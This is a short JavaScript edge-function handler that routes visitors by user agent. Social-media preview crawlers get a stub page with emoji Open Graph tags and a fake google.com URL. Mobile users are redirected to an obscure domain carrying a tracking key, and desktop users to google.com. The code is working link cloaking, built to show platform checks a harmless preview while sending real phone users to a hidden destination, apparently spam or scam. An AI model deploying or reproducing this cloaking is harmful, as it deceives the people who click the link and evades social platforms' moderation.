export async function onRequest(context) {
  const request = context.request;
  const userAgent = request.headers.get('user-agent') || '';

  // 1. Check for Social Media Crawlers / Bots
  const isSocialBot = /facebookexternalhit|Facebot|Twitterbot|Pinterest|LinkedInBot|WhatsApp|TelegramBot/i.test(userAgent);

  if (isSocialBot) {
    const htmlContent = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome</title>
    <meta property="og:title" content="❤️💙💛💜">
    <meta property="og:description" content="">
    <meta property="og:image" content="https://eu-central.storage.cloudconvert.com/tasks/b90eaa65-a314-4189-a804-732724ad6d67/53.svg?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=cloudconvert-production%2F20261027%2Ffra%2Fs3%2Faws4_request&X-Amz-Date=20261027T065008Z&X-Amz-Expires=86400&X-Amz-Signature=18992bd3edde130887feaebc70a27e77393ab4643d835115d7bbcaa783eb077a&X-Amz-SignedHeaders=host&response-content-disposition=inline%3B%20filename%3D%2253.svg%22&response-content-type=image%2Fsvg%2Bxml&x-amz-checksum-mode=ENABLED&x-id=GetObject">
    <meta property="og:url" content="https://www.google.com">
    <meta property="og:type" content="website">
</head>
<body>
</body>
</html>`;

    return new Response(htmlContent, {
      headers: { 'content-type': 'text/html;charset=UTF-8' },
    });
  }

  // 2. Check for Mobile Users
  const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);

  if (isMobile) {
    return Response.redirect("https://markswaitingrouge.com/gpeixuy44e?key=fb5f083d6d407041b969e9429d39ab9d", 302);
  } else {
    return Response.redirect("https://www.google.com", 302);
  }
}
